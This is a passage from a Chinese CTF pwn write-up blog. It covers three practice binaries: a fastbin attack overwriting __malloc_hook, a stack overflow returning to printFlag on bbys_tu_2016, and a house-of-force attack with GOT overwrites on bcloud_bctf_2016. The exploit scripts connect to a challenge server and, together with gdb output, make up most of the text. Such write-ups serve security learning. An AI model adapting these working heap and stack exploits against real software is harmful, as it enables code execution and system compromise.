class="string">&quot;Command:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;4&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Index:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Content: \n&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> p.recvline()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">GDB</span>():</span><br><span class="line">    context.terminal = [<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">    gdb.attach(p)</span><br><span class="line"></span><br><span class="line">Allocate(<span class="number">0x60</span>)</span><br><span class="line">Allocate(<span class="number">0x30</span>)</span><br><span class="line">Fill(<span class="number">0</span>,<span class="string">&quot;a&quot;</span>*<span class="number">0x60</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x71</span>))</span><br><span class="line">Allocate(<span class="number">0x100</span>)</span><br><span class="line">Fill(<span class="number">2</span>,<span class="string">&quot;a&quot;</span>*<span class="number">0x20</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x71</span>))</span><br><span class="line">Free(<span class="number">1</span>)</span><br><span class="line">Allocate(<span class="number">0x60</span>)</span><br><span class="line">Fill(<span class="number">1</span>,<span class="string">&quot;a&quot;</span>*<span class="number">0x30</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x111</span>))</span><br><span class="line">Allocate(<span class="number">0x60</span>)</span><br><span class="line">Free(<span class="number">2</span>)</span><br><span class="line"><span class="built_in">print</span> Dump(<span class="number">1</span>)</span><br><span class="line">leak = u64(Dump(<span class="number">1</span>)[-<span class="number">25</span>:-<span class="number">17</span>])</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;leak:&quot;</span>+<span class="built_in">hex</span>(leak)</span><br><span class="line"></span><br><span class="line">base=leak-<span class="number">0x3c4b78</span></span><br><span class="line">malloc_hook=base+libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(malloc_hook)</span><br><span class="line">Free(<span class="number">1</span>)</span><br><span class="line">Fill(<span class="number">0</span>,<span class="string">&quot;a&quot;</span>*<span class="number">0x60</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x71</span>)+p64(malloc_hook-<span class="number">35</span>)+p64(<span class="number">0</span>))</span><br><span class="line">Allocate(<span class="number">0x60</span>)</span><br><span class="line">Allocate(<span class="number">0x60</span>)</span><br><span class="line">Fill(<span class="number">2</span>,<span class="string">&quot;A&quot;</span>*(<span class="number">35</span>-<span class="number">8</span>-<span class="number">8</span>)+p64(base+<span class="number">0x4526a</span>))</span><br><span class="line">Allocate(<span class="number">0x10</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="bbys_tu_2016"><a class="markdownIt-Anchor" href="#bbys_tu_2016"></a> bbys_tu_2016</h2>
<h3 id="1checksec-11"><a class="markdownIt-Anchor" href="#1checksec-11"></a> 1.checksec</h3>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     i386-32-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>
<h3 id="2ida-11"><a class="markdownIt-Anchor" href="#2ida-11"></a> 2.IDA</h3>
<p><strong>main</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// [esp+14h] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;This program is hungry. You should feed it.&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%s&quot;</span>, &amp;v4);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Do you feel the flow?&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>printFlag</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">printFlag</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s; <span class="comment">// [esp+1Ah] [ebp-3Eh]</span></span><br><span class="line">  FILE *stream; <span class="comment">// [esp+4Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  stream = fopen(<span class="string">&quot;flag.txt&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">  fgets(&amp;s, <span class="number">50</span>, stream);</span><br><span class="line">  <span class="built_in">puts</span>(&amp;s);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  <span class="keyword">return</span> fclose(stream);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>简单栈溢出</p>
</blockquote>
<h3 id="3exp-9"><a class="markdownIt-Anchor" href="#3exp-9"></a> 3.EXP</h3>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">p = remote(<span class="string">&quot;node3.buuoj.cn&quot;</span>,<span class="number">28634</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./bbys_tu_2016&quot;</span>)</span><br><span class="line">print_flag=elf.sym[<span class="string">&quot;printFlag&quot;</span>]</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0xc</span>+<span class="number">8</span>+<span class="number">4</span>)+p32(print_flag)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"><span class="built_in">print</span> p.recv()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="bcloud_bctf_2016"><a class="markdownIt-Anchor" href="#bcloud_bctf_2016"></a> bcloud_bctf_2016</h2>
<h3 id="1checksec-12"><a class="markdownIt-Anchor" href="#1checksec-12"></a> 1.checksec</h3>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     i386-<span class="number">32</span>-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (<span class="number">0x8048000</span>)</span><br></pre></td></tr></table></figure>
<h3 id="2ida-12"><a class="markdownIt-Anchor" href="#2ida-12"></a> 2.IDA</h3>
<p><strong>sub_80487A1</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">int</span> <span class="title function_">sub_80487A1</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s; <span class="comment">// [esp+1Ch] [ebp-5Ch]</span></span><br><span class="line">  <span class="type">char</span> *v2; <span class="comment">// [esp+5Ch] [ebp-1Ch]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v3; <span class="comment">// [esp+6Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  <span class="built_in">memset</span>(&amp;s, <span class="number">0</span>, <span class="number">0x50</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Input your name:&quot;</span>);</span><br><span class="line">  safe_read((<span class="type">int</span>)&amp;s, <span class="number">0x40</span>, <span class="number">10</span>);</span><br><span class="line">  v2 = (<span class="type">char</span> *)<span class="built_in">malloc</span>(<span class="number">0x40</span>u);</span><br><span class="line">  dword_804B0CC = (<span class="type">int</span>)v2;</span><br><span class="line">  <span class="built_in">strcpy</span>(v2, &amp;s);</span><br><span class="line">  start_line((<span class="type">int</span>)v2);</span><br><span class="line">  <span class="keyword">return</span> __readgsdword(<span class="number">0x14</span>u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p><strong>s</strong>的最大为<strong>0x40</strong>，<strong>v2</strong>最大也为<strong>0x40</strong></p>
</blockquote>
<p><strong>sub_8048779</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">sub_8048779</span><span class="params">(<span class="type">int</span> a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Hey %s! Welcome to BCTF CLOUD NOTE MANAGE SYSTEM!\n&quot;</span>, a1);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Now let&#x27;s set synchronization options.&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>这里就可以泄露 <strong>v2</strong> 指针的地址</p>
</blockquote>
<p><strong>sub_804884E</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">int</span> <span class="title function_">sub_804884E</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s; <span class="comment">// [esp+1Ch] [ebp-9Ch]</span></span><br><span class="line">  <span class="type">char</span> *v2; <span class="comment">// [esp+5Ch] [ebp-5Ch]</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// [esp+60h] [ebp-58h]</span></span><br><span class="line">  <span class="type">char</span> *v4; <span class="comment">// [esp+A4h] [ebp-14h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v5; <span class="comment">// [esp+ACh] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  <span class="built_in">memset</span>(&amp;s, <span class="number">0</span>, <span class="number">0x90</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Org:&quot;</span>);</span><br><span class="line">  safe_read((<span class="type">int</span>)&amp;s, <span class="number">0x40</span>, <span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Host:&quot;</span>);</span><br><span class="line">  safe_read((<span class="type">int</span>)&amp;v3, <span class="number">0x40</span>, <span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line">  v4 = (<span class="type">char</span> *)<span class="built_in">malloc</span>(<span class="number">0x40</span>u);</span><br><span class="line">  v2 = (<span class="type">char</span> *)<span class="built_in">malloc</span>(<span class="number">0x40</span>u);</span><br><span class="line">  dword_804B0C8 = (<span class="type">int</span>)v2;</span><br><span class="line">  dword_804B148 = (<span class="type">int</span>)v4;</span><br><span class="line">  <span class="built_in">strcpy</span>(v4, (<span class="type">const</span> <span class="type">char</span> *)&amp;v3);</span><br><span class="line">  <span class="built_in">strcpy</span>(v2, &amp;s);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;OKay! Enjoy:)&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> __readgsdword(<span class="number">0x14</span>u) ^ v5;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>因为这里是32位程序，而且 <strong>s</strong> 和 <strong>v2</strong> 的栈空间相差64，刚好可以覆盖 <strong>v2</strong> 的低地。然后到这一步的话， <strong>top chunk</strong> 又刚好在 <strong>v2</strong> 的下方，<code>strcpy(v2, &amp;s);</code>将<strong>0x40</strong>个字符 + <strong>v2</strong> 地址 + <strong>v3</strong> 内容一同复制进v2可以通过溢出覆盖 <strong>top chunk</strong> 的 <strong>size</strong>域，符合了 <strong>HOF</strong> 的第一个条件 <code>能够以溢出等方式控制到 top chunk 的 size 域</code></p>
</blockquote>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">+-------------+----+--------------------------------+</span><br><span class="line">| <span class="number">0000009</span>C s  | s  | safe_read((<span class="type">int</span>)&amp;s, <span class="number">0x40</span>, <span class="string">&#x27;\n&#x27;</span>);|</span><br><span class="line">+---------------------------------------------------+</span><br><span class="line">| <span class="number">0000005</span>C    | v2 | v2 = (<span class="type">char</span> *)<span class="built_in">malloc</span>(<span class="number">0x40</span>u);    |</span><br><span class="line">+---------------------------------------------------+</span><br><span class="line">| <span class="number">00000058</span>    | v3 |safe_read((<span class="type">int</span>)&amp;v3, <span class="number">0x40</span>, <span class="string">&#x27;\n&#x27;</span>);|</span><br><span class="line">+---------------------------------------------------+    </span><br><span class="line"><span class="built_in">strcpy</span>(v2, &amp;s);</span><br></pre></td></tr></table></figure>
<h3 id="3思路"><a class="markdownIt-Anchor" href="#3思路"></a> 3.思路</h3>
<blockquote>
<ol>
<li>利用初始化名字处的漏洞泄漏堆的基地址。。</li>
<li>利用 <strong>house of force</strong> 将 <strong>top chunk</strong> 分配至全局的 <strong>0x0804B0A0</strong> 的 <strong>&amp;notesize-8</strong> 处，当再次申请内存时，便返回<strong>notesize</strong>地址处的内存，从而我们就可以控制所有<strong>note</strong>的大小以及对应的地址了。</li>
<li>修改前三个 note 的大小为16，并修改其指针为 <strong>free@got</strong>，<strong>notesize</strong>，<strong>libc_start</strong></li>
<li>将 <strong>free@got</strong> 修改为 <strong>puts@plt</strong>。</li>
<li>泄漏 <strong>libc_start</strong> 地址。</li>
<li>再次修改另外一个 <strong>free@got</strong> 项为 <strong>system</strong> 地址，从而拿到shell。</li>
</ol>
</blockquote>
<h3 id="4gdb"><a class="markdownIt-Anchor" href="#4gdb"></a> 4.gdb</h3>
<h4 id="0x1-leak_addr"><a class="markdownIt-Anchor" href="#0x1-leak_addr"></a> 0x1 leak_addr</h4>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">0x804c000:	0x0000004900000000	0x6161616161616161</span><br><span class="line">0x804c010:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x804c020:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x804c030:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x804c040:	0x6161616161616161	0x00020f000804c008</span><br></pre></td></tr></table></figure>
<blockquote>
<p><code>0x00020f000804c008</code>发现距离地址相差 <strong>8</strong>，所以之后要去减去</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#code:</span></span><br><span class="line">    sh.sendafter(<span class="string">&quot;Input your name:\n&quot;</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x40</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x40</span>)</span><br><span class="line">    leak = u32(sh.recv(<span class="number">4</span>)) - <span class="number">8</span></span><br><span class="line">    log.success(<span class="string">&quot;leak addr &gt; 0x%x&quot;</span>,leak)</span><br><span class="line">    gdb.attach(sh)</span><br><span class="line"><span class="comment">#gdb</span></span><br><span class="line"><span class="number">0x9e89000</span>:	<span class="number">0x0000004900000000</span>	<span class="number">0x6161616161616161</span></span><br><span class="line"><span class="number">0x9e89010</span>:	<span class="number">0x6161616161616161</span>	<span class="number">0x6161616161616161</span></span><br><span class="line"><span class="number">0x9e89020</span>:	<span class="number">0x6161616161616161</span>	<span class="number">0x6161616161616161</span></span><br><span class="line"><span class="number">0x9e89030</span>:	<span class="number">0x6161616161616161</span>	<span class="number">0x6161616161616161</span></span><br><span class="line"><span class="number">0x9e89040</span>:	<span class="number">0x6161616161616161</span>	<span class="number">0x00020f0009e89008</span></span><br><span class="line"><span class="number">0x9e89050</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="comment">#gef</span></span><br><span class="line">gef➤  heap chunks</span><br><span class="line">Chunk(addr=<span class="number">0x9e89008</span>, size=<span class="number">0x48</span>, flags=PREV_INUSE)</span><br><span class="line">··········································</span><br><span class="line">Chunk(addr=<span class="number">0x9e89050</span>, size=<span class="number">0x48</span>, flags=PREV_INUSE)</span><br><span class="line">··········································</span><br><span class="line">Chunk(addr=<span class="number">0x9e89098</span>, size=<span class="number">0x48</span>, flags=PREV_INUSE)</span><br><span class="line">··········································</span><br><span class="line">Chunk(addr=<span class="number">0x9e890e0</span>, size=<span class="number">0x20e70</span>, flags=PREV_INUSE)  ←  top chunk</span><br><span class="line">··········································</span><br><span class="line"><span class="comment">#计算</span></span><br><span class="line">&gt;&gt;&gt;<span class="built_in">hex</span>(<span class="number">0x9e890e0</span> - <span class="number">0x9e89008</span>)</span><br><span class="line"><span class="number">0xd8</span>		<span class="comment">#得到top_chunk相对偏移</span></span><br></pre></td></tr></table></figure>
<h4 id="0x2-hof"><a class="markdownIt-Anchor" href="#0x2-hof"></a> 0x2 hof</h4>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#code:</span></span><br><span class="line">	sh.sendafter(<span class="string">&quot;Org:\n&quot;</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">64</span>)</span><br><span class="line">	sh.sendlineafter(<span class="string">&quot;Host:\n&quot;</span>,p32(<span class="number">0xffffffff</span>))</span><br><span class="line">	log.success(<span class="string">&quot;top chunk &gt; 0x%x&quot;</span>,top_chunk)</span><br><span class="line"><span class="comment">#gdb</span></span><br><span class="line"><span class="number">0x9e89008</span>:	<span class="number">0x6161616161616161</span>	<span class="number">0x6161616161616161</span></span><br><span class="line"><span class="number">0x9e89018</span>:	<span class="number">0x6161616161616161</span>	<span class="number">0x6161616161616161</span></span><br><span class="line"><span class="number">0x9e89028</span>:	<span class="number">0x6161616161616161</span>	<span class="number">0x6161616161616161</span></span><br><span class="line"><span class="number">0x9e89038</span>:	<span class="number">0x6161616161616161</span>	<span class="number">0x6161616161616161</span></span><br><span class="line"><span class="number">0x9e89048</span>:	<span class="number">0x0000004909e89008</span>	<span class="number">0x00000000ffffffff</span></span><br><span class="line"><span class="number">0x9e89058</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x9e89068</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x9e89078</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x9e89088</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000004900000000</span></span><br><span class="line"><span class="number">0x9e89098</span>:	<span class="number">0x6161616161616161</span>	<span class="number">0x6161616161616161</span></span><br><span class="line"><span class="number">0x9e890a8</span>:	<span class="number">0x6161616161616161</span>	<span class="number">0x6161616161616161</span></span><br><span class="line"><span class="number">0x9e890b8</span>:	<span class="number">0x6161616161616161</span>	<span class="number">0x6161616161616161</span></span><br><span class="line"><span class="number">0x9e890c8</span>:	<span class="number">0x6161616161616161</span>	<span class="number">0x6161616161616161</span></span><br><span class="line"><span class="number">0x9e890d8</span>:	<span class="number">0xffffffff09e89098</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x9e890e8</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x9e890f8</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="comment">#gef</span></span><br><span class="line">gef➤  heap chunks</span><br><span class="line">Chunk(addr=<span class="number">0x9e89008</span>, size=<span class="number">0x48</span>, flags=PREV_INUSE)</span><br><span class="line">Chunk(addr=<span class="number">0x9e89050</span>, size=<span class="number">0x48</span>, flags=PREV_INUSE)</span><br><span class="line">Chunk(addr=<span class="number">0x9e89098</span>, size=<span class="number">0x48</span>, flags=PREV_INUSE)</span><br><span class="line">Chunk(addr=<span class="number">0x9e890e0</span>, size=<span class="number">0xfffffff8</span>, flags=PREV_INUSE|IS_MMAPPED|NON_MAIN_ARENA)  ←  top chunk</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<blockquote>
<p><strong>top chunk</strong> 的 <strong>size</strong>域被改变了</p>
</blockquote>
<h4 id="0x3-迁移top-chunk"><a class="markdownIt-Anchor" href="#0x3-迁移top-chunk"></a> 0x3 迁移top chunk</h4>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#code:</span></span><br><span class="line">	notesize_addr = <span class="number">0x0804B0A0</span></span><br><span class="line">	notelist_addr = <span class="number">0x0804B120</span></span><br><span class="line">	target = notesize_addr - <span class="number">8</span></span><br><span class="line">	offset  = target - top_chunk - <span class="number">8</span></span><br><span class="line">	log.success(<span class="string">&quot;offset &gt; &quot;</span>+<span class="built_in">hex</span>(offset))</span><br><span class="line">	add(offset,<span class="string">&quot;aaaa&quot;</span>)</span><br><span class="line"><span class="comment">#terminal</span></span><br><span class="line">[+] 1st chunk addr &gt; <span class="number">0x9f8c000</span></span><br><span class="line">[+] top chunk &gt; <span class="number">0x9f8c0d8</span></span><br><span class="line">[+] offset &gt; -<span class="number">0x1f41048</span></span><br><span class="line"><span class="comment">#pwndbg</span></span><br><span class="line"><span class="number">0x804b098</span> PREV_INUSE &#123;</span><br><span class="line">  prev_size = <span class="number">0</span>, </span><br><span class="line">  size = <span class="number">32772153</span>, </span><br><span class="line">  fd = <span class="number">0xfe0befb8</span>, </span><br><span class="line">  bk = <span class="number">0x0</span>, </span><br><span class="line">  fd_nextsize = <span class="number">0x0</span>, </span><br><span class="line">  bk_nextsize = <span class="number">0x0</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>发现多了这个 <strong>chunk</strong> ，地址=<strong>notesize_addr - 8</strong><br />
说明迁移成功，那么下一次就会分配chunk到这里来</p>
</blockquote>
<h4 id="0x4-freegot泄露"><a class="markdownIt-Anchor" href="#0x4-freegot泄露"></a> 0x4 <strong>free@got</strong>泄露</h4>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#code:</span></span><br><span class="line">	payload = p32(<span class="number">16</span>) * <span class="number">3</span> </span><br><span class="line">	payload += (notelist_addr - notesize_addr - <span class="number">12</span>) * <span class="string">&#x27;a&#x27;</span> </span><br><span class="line">	payload += p32(elf.got[<span class="string">&#x27;free&#x27;</span>]) + p32(elf.got[<span class="string">&#x27;atoi&#x27;</span>]) * <span class="number">2</span></span><br><span class="line">	add(<span class="number">1000</span>,payload)</span><br><span class="line"><span class="comment">#pwndbg</span></span><br><span class="line"><span class="number">0x804b098</span>:	<span class="number">0x00000000</span>	<span class="number">0x01f41039</span>	<span class="number">0xfe0befb8</span>	<span class="number">0x00000000</span></span><br><span class="line"><span class="number">0x804b0a8</span>:	<span class="number">0x00000000</span>	<span class="number">0x00000000</span>	<span class="number">0x00000000</span>	<span class="number">0x00000000</span></span><br><span class="line"><span class="number">0x804b0b8</span>:	<span class="number">0x00000000</span>	<span class="number">0x00000000</span>	<span class="number">0x00000000</span>	<span class="number">0x00000000</span></span><br><span class="line"><span class="number">0x804b0c8</span>:	<span class="number">0x09f8c098</span>	<span class="number">0x09f8c008</span>	<span class="number">0x00000000</span>	<span class="number">0x00000000</span></span><br></pre></td></tr></table></figure>
<h3 id="5exp"><a class="markdownIt-Anchor" href="#5exp"></a> 5.EXP</h3>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level = &quot;debug&quot;</span></span><br><span class="line">context.arch = <span class="string">&quot;i386&quot;</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./bcloud_bctf_2016&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;/home/joe1sn/libc/32/libc-2.23.so&quot;</span>)</span><br><span class="line">sh = remote(<span class="string">&quot;node3.buuoj.cn&quot;</span>,<span 